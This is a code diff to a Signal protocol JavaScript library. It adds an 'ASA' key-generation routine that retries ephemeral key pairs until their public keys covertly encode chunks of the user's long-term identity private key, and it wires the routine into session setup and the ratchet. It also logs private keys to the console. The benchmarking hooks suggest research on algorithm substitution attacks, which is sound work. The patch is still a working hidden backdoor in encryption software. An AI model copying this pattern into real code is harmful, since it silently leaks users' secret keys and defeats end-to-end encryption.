@@ -1,0 +1,174 @@
+diff --git a/libtextsecure/libsignal-protocol.js b/libtextsecure/libsignal-protocol.js
+index c95d25cb..4c71deac 100644
+--- a/libtextsecure/libsignal-protocol.js
++++ b/libtextsecure/libsignal-protocol.js
+@@ -1,4 +1,26 @@
+ ;(function(){
++
++// --- ASA variables ---
++
++// Constants
++var asaKey = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]);
++var asaLeakageTotalLengthBytes = 32;
++var asaLeakageTotalLengthBits = 8 * asaLeakageTotalLengthBytes;
++var asaPayloadChunkLengthBits = 8; // Must be 1, 2, 4 or 8
++var asaPayloadChunkCount = asaLeakageTotalLengthBits / asaPayloadChunkLengthBits;
++var asaPayloadChunkOffsetLength = Math.log2(asaPayloadChunkCount);
++var asaPayloadChunkOffsetMask = 2 ** asaPayloadChunkOffsetLength - 1;
++var asaPayloadChunkMask = 2 ** asaPayloadChunkLengthBits - 1;
++
++// Embedded bits per key pair depending on chunk length:
++// 1 bits -> 8 + 1 = 9
++// 2 bits -> 7 + 2 = 9
++// 4 bits -> 6 + 4 = 10
++// 8 bits -> 5 + 8 = 13
++
++// --- End ASA variables ---
++
++
+ var Internal = {};
+ window.libsignal = window.libsignal || {};
+ // The Module object: Our interface to the outside world. We import
+@@ -194,8 +216,6 @@ for (var key in moduleOverrides) {
+   }
+ }
+ 
+-
+-
+ // === Preamble library stuff ===
+ 
+ // Documentation for the public APIs defined in this file must be updated in:
+@@ -23939,6 +23959,77 @@ var Internal = Internal || {};
+             }
+             return Internal.Curve.async.createKeyPair(privKey);
+         },
++        createKeyPairAsa: function(payload) {
++
++            // Benchmark
++            var asaKeyPairRetryCount = 0;
++
++            // Mark begin of key generation
++            console.log('##ASA-TIMER##');
++
++            // Byte representation of payload
++            var asaPayloadBytes = new Uint8Array(payload);
++
++            // Helper function for logging benchmark results
++            // From https://stackoverflow.com/a/50767210
++            const bufferToHex = function(buffer) {
++                return [...new Uint8Array (buffer)]
++                    .map (b => b.toString (16).padStart (2, "0"))
++                    .join ("");
++            }
++
++            // Helper function for updating private key bytes
++            var asaPrivKeyRandomBytes = new Uint8Array(Internal.crypto.getRandomBytes(32));
++            const updateRandomBytes = function() {
++                for(let i = 1; i < asaPrivKeyRandomBytes.length; ++i) {
++                    ++asaPrivKeyRandomBytes[i];
++                    if(asaPrivKeyRandomBytes[i] != 0)
++                        break;
++                }
++            }
++
++            // Generate new key pairs and look for valid payloads
++            const createKeyPairWithEncodedPayload = function() {
++
++                // Generate new key pair and encode public key
++                let keyPairPromise = Internal.Curve.async.createKeyPair(asaPrivKeyRandomBytes);
++                let pubKeyEncryptedPromise = keyPairPromise.then(function(keyPair) {
++                    return Internal.crypto.sign(asaKey, keyPair.pubKey);
++                });
++
++                return Promise.all([keyPairPromise, pubKeyEncryptedPromise]).then(function([keyPair, enc]) {
++
++                    // Benchmark
++                    ++asaKeyPairRetryCount;
++
++                    // Retrieve chunk offset
++                    let encBytes = new Uint8Array(enc);
++                    let payloadChunkOffset = encBytes[0] & asaPayloadChunkOffsetMask;
++                    let payloadOffset = payloadChunkOffset * asaPayloadChunkLengthBits;
++                    if(payloadOffset >= asaLeakageTotalLengthBits) {
++                        updateRandomBytes();
++                        return createKeyPairWithEncodedPayload();
++                    }
++
++                    // Find chunk
++                    let encodedChunk = asaPayloadBytes[payloadOffset >> 3];
++                    let encodedChunkShift = 8 - ((payloadOffset + asaPayloadChunkLengthBits) & 0x7);
++                    if(encodedChunkShift < 8)
++                        encodedChunk >>= encodedChunkShift;
++
++                    // Check chunk
++                    if((encodedChunk & asaPayloadChunkMask) != (encBytes[1] & asaPayloadChunkMask)) {
++                        updateRandomBytes();
++                        return createKeyPairWithEncodedPayload();
++                    }
++
++                    // Success
++                    console.log('##ASA-BEGIN##', { 'msg': 'Created new key pair', 'tries': asaKeyPairRetryCount, 'identityKey': bufferToHex(payload), 'privKey': bufferToHex(keyPair.privKey), 'pubKey': bufferToHex(keyPair.pubKey), 'enc': bufferToHex(enc) }, '##ASA-END##');
++                    return keyPair;
++                });
++            }
++            return createKeyPairWithEncodedPayload();
++        },
+         ECDHE: function(pubKey, privKey) {
+             return Internal.Curve.async.ECDHE(pubKey, privKey);
+         },
+@@ -24653,7 +24744,7 @@ SessionBuilder.prototype = {
+             if (isInitiator) {
+                 session.indexInfo.baseKey = ourEphemeralKey.pubKey;
+                 session.indexInfo.baseKeyType = Internal.BaseKeyType.OURS;
+-                return Internal.crypto.createKeyPair().then(function(ourSendingEphemeralKey) {
++                return Internal.crypto.createKeyPairAsa(ourIdentityKey.privKey).then(function(ourSendingEphemeralKey) {
+                     session.currentRatchet.ephemeralKeyPair = ourSendingEphemeralKey;
+                     return this.calculateSendingRatchet(session, theirSignedPubKey).then(function() {
+                         return session;
+@@ -25045,7 +25136,24 @@ SessionCipher.prototype = {
+                   delete session[previousRatchet];
+               }
+ 
+-              return Internal.crypto.createKeyPair().then(function(keyPair) {
++              // ASA BENCHMARK
++              if(false)
++              {
++                  return this.storage.getIdentityKeyPair().then(function(ourIdentityKey) {
++                      // Benchmark
++                      var asaBenchmarkStart = window.performance.now();
++                      let asaKeyPairMeasurementPromise = Promise.resolve(1);
++                      for(let i = 0; i < 1000; ++i)
++                      {
++                          asaKeyPairMeasurementPromise = asaKeyPairMeasurementPromise.then(function(keyPair) {
++                              return Internal.crypto.createKeyPairAsa(ourIdentityKey.privKey);
++                          }.bind(this));
++                      }
++                      return asaKeyPairMeasurementPromise.then(function(keyPair) {
++                          var asaBenchmarkEnd = window.performance.now();
++                          console.log(`##ASA-BENCKMARK## ${(asaBenchmarkEnd - asaBenchmarkStart)} ms`);
++
++                          return Internal.crypto.createKeyPairAsa(ourIdentityKey.privKey).then(function(keyPair) {
+                               ratchet.ephemeralKeyPair = keyPair;
+                               return this.calculateRatchet(session, remoteKey, true).then(function() {
+                                   ratchet.lastRemoteEphemeralKey = remoteKey;
+@@ -25053,6 +25161,20 @@ SessionCipher.prototype = {
+                           }.bind(this));
+                       }.bind(this));
+                   }.bind(this));
++              }
++              else
++              {
++                  return this.storage.getIdentityKeyPair().then(function(ourIdentityKey) {
++                      return Internal.crypto.createKeyPairAsa(ourIdentityKey.privKey).then(function(keyPair) {
++                          ratchet.ephemeralKeyPair = keyPair;
++                          return this.calculateRatchet(session, remoteKey, true).then(function() {
++                              ratchet.lastRemoteEphemeralKey = remoteKey;
++                          }.bind(this));
++                      }.bind(this));
++                  }.bind(this));
++              }
++          }.bind(this));
++      }.bind(this));
+   },
+   calculateRatchet: function(session, remoteKey, sending) {
+       var ratchet = session.currentRatchet;
